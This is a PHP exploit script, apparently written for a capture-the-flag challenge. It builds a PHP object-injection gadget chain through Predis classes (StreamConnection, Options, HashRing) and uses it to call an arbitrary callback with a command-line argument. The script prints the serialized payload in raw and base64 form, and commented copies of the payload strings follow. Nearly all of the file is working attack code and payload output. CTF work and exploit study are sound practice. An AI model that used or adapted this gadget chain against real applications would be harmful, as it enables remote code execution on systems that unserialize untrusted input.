<?php
namespace Predis\Connection {

    class StreamConnection
    {
        public $parameters;

        function __construct($parameters)
        {

            $this->parameters = $parameters;
        }
    }
}

namespace Predis\Configuration {

    class Options
    {
        public $options;
        public $input;
        public $handlers;

        function __construct($options, $input, $handlers)
        {
            $this->options = $options;
            $this->input = $input;
            $this->handlers = $handlers;
        }
    }
}

namespace Predis\Cluster\Distributor {

    class HashRing
    {
        public $nodeHashCallback;
        public $nodes;

        function __construct($nodeHashCallback, $nodes)
        {
            $this->nodeHashCallback = $nodeHashCallback;
            $this->nodes = $nodes;
        }
    }
}

namespace Predis\Configuration\Options {

    class Commands
    {
    }
}

namespace {
    // $cmd = "\Predis\Configuration\Option\Commands";
    $cmd = "Predis\Configuration\Option\Commands";

    $hash_ring = new Predis\Cluster\Distributor\HashRing('p0pp3r_win', [['weight' => 1, 'object' => './@ --give-me-flag']]);

    $options = [];
    $input = ['persistent' => [$hash_ring, "getSlot"]];
    $handlers = ['persistent' => $cmd];

    $parameters = new Predis\Configuration\Options($options, $input, $handlers);
    $ori_name = new Predis\Connection\StreamConnection($parameters);

    $name = unserialize(serialize($ori_name));

    $name = serialize($name);
    echo $name;
    echo "\n";

    $name = base64_encode(serialize($ori_name));
    echo $name;
    echo "\n";

    echo "predis/predis\n";

    die();

    // new king
    // O:34:"Predis\Connection\StreamConnection":1:{s:10:"parameters";O:28:"Predis\Configuration\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\Cluster\Distributor\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\Configuration\Option\Commands";}}

    // O:34:"Predis\Connection\StreamConnection":1:{s:10:"parameters";O:28:"Predis\Configuration\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\Cluster\Distributor\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\Configuration\Option\Commands";}}}
}

?>